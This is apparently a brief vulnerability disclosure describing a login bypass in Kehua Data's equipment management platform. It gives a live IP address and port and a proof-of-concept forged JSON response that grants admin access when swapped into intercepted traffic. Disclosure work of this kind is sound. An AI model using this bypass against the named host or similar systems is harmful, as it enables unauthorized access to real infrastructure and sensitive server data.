There is a logical vulnerability in the equipment management platform of Kehua Data Co., Ltd., which can be exploited to obtain sensitive server information.

official：http://www.china-shine.com.cn/

version:1.0

 Vulnerability Path  ：/home

See the login page.

http://139.9.78.15:9999/home
<img width="702" height="382" alt="image" src="https://github.com/user-attachments/assets/b7e49753-509f-4930-a70d-88dcafc7d933" />
Enter password arbitrarily, capture packets, modify response packets, successfully bypass login and enter the system
poc：
{"code":1,"message":"登录成功","data":"admin"}
<img width="981" height="617" alt="image" src="https://github.com/user-attachments/assets/5fa797dd-5111-479e-9ee9-64c75c5c8f02" />
<img width="992" height="634" alt="image" src="https://github.com/user-attachments/assets/2567ae99-2955-4ee4-8ddf-7fe4f9763a50" />
<img width="978" height="564" alt="image" src="https://github.com/user-attachments/assets/2946bb99-e6d0-4e8b-8fbb-5cafdf9d0bf8" />
